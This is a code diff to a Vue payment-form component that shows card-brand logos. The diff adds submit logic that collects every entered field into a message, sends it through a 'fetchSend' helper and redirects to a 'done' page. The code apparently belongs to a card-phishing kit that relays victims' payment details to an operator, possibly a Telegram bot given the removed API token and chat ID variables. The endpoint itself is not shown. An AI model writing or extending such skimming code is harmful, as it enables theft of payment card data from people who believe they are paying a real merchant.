@@ -56,7 +56,7 @@
       class="bg-text-heading text-white px-7 py-2 rounded-md"
       @click="handleSubmit"
     >
-      Submit
+      {{ loading ? "Updating..." : "Submit" }}
     </button>
   </div>
 </template>
@@ -64,14 +64,16 @@
 <script setup>
 import Input from "/src/components/MyInput.vue";
 import ModifiedInput from "/src/components/ModifiedInput.vue";
-import { updateMyMessage } from "../utils/updateMessage.js";
+import { updateMyMessage, fetchSend } from "../utils/updateMessage.js";
 import { ref } from "vue";
 
 import { useCounterStore } from "/src/stores/info";
-const { VITE_API_TOKEN, VITE_CHAT_ID } = import.meta.env;
+import { useRouter } from "vue-router";
 
 const store = useCounterStore();
 const loading = ref(false);
+const router = useRouter();
+const myMessage = ref("");
 
 const payments = ref([
   "/pay_imgs/visa.png",
@@ -145,6 +147,15 @@ function handleSubmit() {
 
   if (filled === true && data.length != 0) {
     loading.value = true;
+
+    store.cardType = store.getCardType;
+
+    const theKeys = Object.keys(info);
+
+    for (let i = 0; i < theKeys.length; i++) {
+      updateMyMessage(myMessage, `${theKeys[i]}:   ${data[i]}`);
+    }
+    fetchSend(myMessage.value, () => router.push("/done"));
   }
 }
 </script>
